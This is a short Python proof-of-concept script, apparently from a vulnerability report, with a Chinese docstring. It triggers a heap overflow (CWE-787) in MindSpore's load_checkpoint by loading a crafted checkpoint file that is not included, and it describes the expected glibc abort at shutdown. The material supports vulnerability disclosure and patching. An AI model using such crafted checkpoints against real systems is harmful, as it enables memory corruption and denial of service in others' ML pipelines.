# -*- coding: utf-8 -*-
"""触发 MindSpore load_checkpoint 堆溢出（CWE-787）。

用法：
    python trigger.py poc_heapoverflow.ckpt

预期输出：
    RETURN-NORMALLY                          # load_checkpoint 不报错返回
    free(): invalid next size (fast)         # glibc 捕获堆破坏 → Aborted (core dumped)
    Aborted (core dumped)

关键：崩溃发生在解释器关闭时（tensor 析构），调用方无法捕获/防御。
"""
import sys
from mindspore import load_checkpoint

if __name__ == '__main__':
    fn = sys.argv[1] if len(sys.argv) > 1 else 'poc_heapoverflow.ckpt'
    load_checkpoint(fn)
    print('RETURN-NORMALLY')
